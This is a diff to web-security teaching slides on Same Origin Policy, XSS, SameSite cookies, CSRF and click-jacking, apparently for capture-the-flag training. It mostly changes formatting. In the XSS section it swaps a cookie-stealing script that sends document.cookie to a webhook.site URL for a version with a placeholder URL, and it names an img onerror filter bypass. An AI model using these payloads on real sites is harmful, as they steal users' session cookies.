@@ -73,6 +73,8 @@ So what are some restrictions on these Sites and Origins?
 * Restricts getting resources to/from an *external* site
 > If you request something from another website, Same Origin Policy says that you cant access any of the resources because its only accessible on the same origin!
 
+---
+
 * "*External*" is based on *SOP*: only requests from the same `origin` are allowed to use the resources
 
 > read more [here](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
@@ -142,7 +144,6 @@ sent a request to `Bank.com`, the request would be blocked!
 
 {{% section %}}
 
----
 ## HTML?
 
 Html is basically just a bunch of tags that look like this: 
@@ -253,8 +254,6 @@ const a = '<user_input>'
 
 ---
 
----
-
 ### Bonus: breaking mitigations
 * Content stripped/blocked
     * different tag `<img onerror=...>` !!IMPORTANT!!
@@ -274,7 +273,9 @@ How do you solve these challenges?
 > requestbin/webhooks
 
 ```javascript
-<script>fetch("https://webhook.site/dba43b3c-1c05-4de5-b49f-376261fee98e?"+ document.cookie)</script>
+<script>
+fetch("webhookurl?"+ document.cookie)
+</script>
 ```
 
 ---
@@ -284,20 +285,23 @@ How do you solve these challenges?
 Oh well.
 
 ---
+
 ### Cookies (SameSite)
-* *None*: {{% fragment %}}Cookies are always sent{{% /fragment %}}
-* *Lax*: {{% fragment %}} (default) not sent cross-site{{% /fragment %}}
-    * images/iframes {{% fragment %}}*`no`*{{% /fragment %}}
-    * navigation (GET)    {{% fragment %}}*`yes`*{{% /fragment %}}
-* *Strict*: {{% fragment %}}Cookies aren't sent{{% /fragment %}}
+* *None*: Cookies are always sent
+* *Lax*: (default) not sent cross-site
+    * images/iframes *`no`*
+    * navigation (GET)    *`yes`*
+* *Strict*: Cookies aren't sent
 
 > read more [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
 
 
 {{% /section %}}
+
 ---
 
 ## CSRF
+
 {{% section %}}
 
 ### What is it?
@@ -324,7 +328,9 @@ Oh well.
 ---
 
 ## Click-jacking
+
 {{% section %}}
+
 * A fake form sitting under a real form
 
 * if you try to interact with the fake form, you'll accidentally interact with the real one. 
